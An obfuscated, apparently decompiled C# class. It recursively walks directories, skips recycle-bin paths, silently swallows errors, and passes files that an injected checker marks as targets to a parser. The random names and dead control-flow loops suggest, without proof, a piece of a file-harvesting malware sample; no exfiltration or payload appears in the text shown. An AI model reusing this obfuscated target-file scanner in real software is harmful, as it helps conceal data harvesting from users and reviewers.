using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace jgfjkggkiiy;

internal class dw
{
	private ifc FileChecker
	{
		[CompilerGenerated]
		get
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
			return _003CFileChecker_003Ek__BackingField;
		}
		[CompilerGenerated]
		set
		{
			_003CFileChecker_003Ek__BackingField = value;
		}
	}

	private ifp FileParser { get; set; }

	public dw(ifc fileChecker, ifp fileParser)
	{
		FileChecker = fileChecker;
		FileParser = fileParser;
	}

	public void GetTypesFromInterfacewriteToConsoleGetPermissions(string startDirectory)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string[] files = Directory.GetFiles(startDirectory);
			for (int i = 0; i < files.Length; i++)
			{
				get_HeadlineAddPlayerToGroupget_Configuration(files[i].ToLower());
				Thread.Sleep(0);
			}
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(startDirectory);
			foreach (string startDirectory2 in directories)
			{
				GetTypesFromInterfacewriteToConsoleGetPermissions(startDirectory2);
				Thread.Sleep(0);
			}
		}
		catch
		{
		}
	}

	private void get_HeadlineAddPlayerToGroupget_Configuration(string filePath)
	{
		if (Awakeset_AvatarMediumGetGroups(filePath))
		{
			FileParser.ParseFile(filePath);
		}
	}

	private bool Awakeset_AvatarMediumGetGroups(string filePath)
	{
		int num = 0;
		do
		{
			if (num != 2)
			{
				if (num == 1)
				{
					if (filePath.Contains("recycle"))
					{
						break;
					}
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				continue;
			}
			return FileChecker.IsTargetFile(filePath);
		}
		while (num != 3);
		return false;
	}
}
